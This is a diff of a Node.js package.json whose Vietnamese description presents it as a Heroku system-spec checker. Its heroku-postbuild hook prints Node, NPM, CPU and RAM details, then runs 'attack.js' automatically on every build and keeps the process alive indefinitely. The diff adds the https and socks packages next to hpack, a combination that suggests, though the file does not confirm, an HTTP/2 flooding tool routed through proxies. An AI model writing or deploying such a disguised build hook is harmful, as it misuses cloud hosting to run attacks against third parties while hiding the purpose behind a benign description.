@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "Ứng dụng kiểm tra thông số hệ thống trên logs Heroku",
   "scripts": {
-    "heroku-postbuild": "echo '🔄 Đang cài đặt dependencies...' && npm install hpack commander colors && echo '⏳ Đang kiểm tra thông tin hệ thống...' && echo '📌 Node.js Version:' $(node -v) && echo '📌 NPM Version:' $(npm -v) && echo '📌 CPU Cores:' $(nproc) && echo '📌 Total RAM:' $(awk '/MemTotal/ {printf \"%.2f GB\\n\", $2/1024/1024}' /proc/meminfo) && node attack.js && tail -f /dev/null"
+    "heroku-postbuild": "echo '🔄 Đang cài đặt dependencies...' && npm install hpack https commander colors socks && echo '⏳ Đang kiểm tra thông tin hệ thống...' && echo '📌 Node.js Version:' $(node -v) && echo '📌 NPM Version:' $(npm -v) && echo '📌 CPU Cores:' $(nproc) && echo '📌 Total RAM:' $(awk '/MemTotal/ {printf \"%.2f GB\\n\", $2/1024/1024}' /proc/meminfo) && node attack.js && tail -f /dev/null"
   },
   "engines": {
     "node": "20.x",
@@ -11,7 +11,9 @@
   },
   "dependencies": {
     "hpack": "*",
+    "https": "*",
     "commander": "*",
-    "colors": "*"
+    "colors": "*",
+    "socks": "*"
   }
 }
